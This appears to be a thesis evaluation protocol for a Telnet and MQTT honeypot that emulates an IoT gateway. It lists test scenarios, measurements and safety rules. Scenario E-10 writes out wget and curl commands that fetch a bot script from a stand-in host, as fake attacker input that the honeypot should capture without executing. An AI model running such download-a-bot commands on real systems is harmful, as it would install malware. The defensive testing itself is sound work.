# Reproducible Evaluation Protocol

This protocol provides a non-cloud experiment for the thesis. It uses loopback
clients and fake payloads only; it does not scan external systems or contact
attacker infrastructure.

## Preconditions

```bash
dotnet build TelemoqNet.slnx
dotnet test TelemoqNet.IntegrationTests/TelemoqNet.IntegrationTests.csproj
```

Record the commit, operating system, .NET SDK version, CPU count, and memory.
Use a temporary local CSV path or an in-memory store for repeatable runs.

## Scenarios

| ID | Scenario | Input | Expected evidence |
|---|---|---|---|
| E-01 | Telnet login and shell interaction | Valid fake credentials; `whoami`, `pwd`, `exit` | One authenticated session, ordered commands and responses |
| E-02 | Failed authentication | Invalid fake username/password | Failed login record; password absent from logs |
| E-03 | Telnet malformed input | Line longer than configured maximum | Protocol-error event; session remains bounded and responsive |
| E-04 | MQTT publish/subscribe | Local client publishes a fake JSON payload | Publish metadata, topic, length, hash, and bounded sample |
| E-05 | MQTT invalid authentication | Invalid configured username/password | CONNACK refusal and failed authentication event |
| E-06 | MQTT malformed packet | Invalid fixed header or oversized remaining length | Protocol error; no process termination |
| E-07 | Resource limits | More clients than global/per-IP limits | Excess clients rejected; accepted sessions remain usable |
| E-08 | Persistence | Complete synthetic session | All metadata, login attempts, commands, and events readable from JSON blob |
| E-09 | Isolation | Two concurrent Telnet sessions create/read the same virtual path | State exists only in the creating session |
| E-10 | Payload retrieval attempt | `wget -O /tmp/bot http://example.invalid/bot.sh`; `curl https://example.invalid/bot.sh` | Plausible network error; original command/response and structured `payload.download_attempt`; `Executed=false`, `Downloaded=false`; no outbound request or payload file |
| E-11 | Coherent gateway identity | Telnet banner, `hostname`, `uname -a`, device files, `netstat`; MQTT `home/gateway/#` | Matching HG-200 model, firmware 1.4.2 and hostname; MQTT listener visible only when enabled |

## Measurements

For each scenario record:

1. Number of attempted and accepted connections.
2. Authentication outcomes.
3. Number and order of captured commands/messages/events.
4. Response correctness and protocol error behavior.
5. Persistence success or failure.
6. Peak process memory and CPU during the bounded load scenario.
7. Whether any external DNS, TCP, or process-execution activity occurred.

Repeat timing and resource measurements at least five times and report median
and maximum values. Functional assertions should be binary; do not convert a
failed safety assertion into an average or percentage.

## Safety evidence

Use fake hostnames and payloads such as `{"action":"download","url":"http://example.invalid"}`.
The expected result is a simulated response and no outbound request. Do not use
real malware, real credentials, public targets, or attacker infrastructure.

## Reporting results

The thesis should include the environment, exact commands, scenario inputs,
expected versus observed results, limitations, and a short interpretation.
The automated test suite provides regression evidence; this protocol provides
the methodology for a separate experiment and measured evaluation.
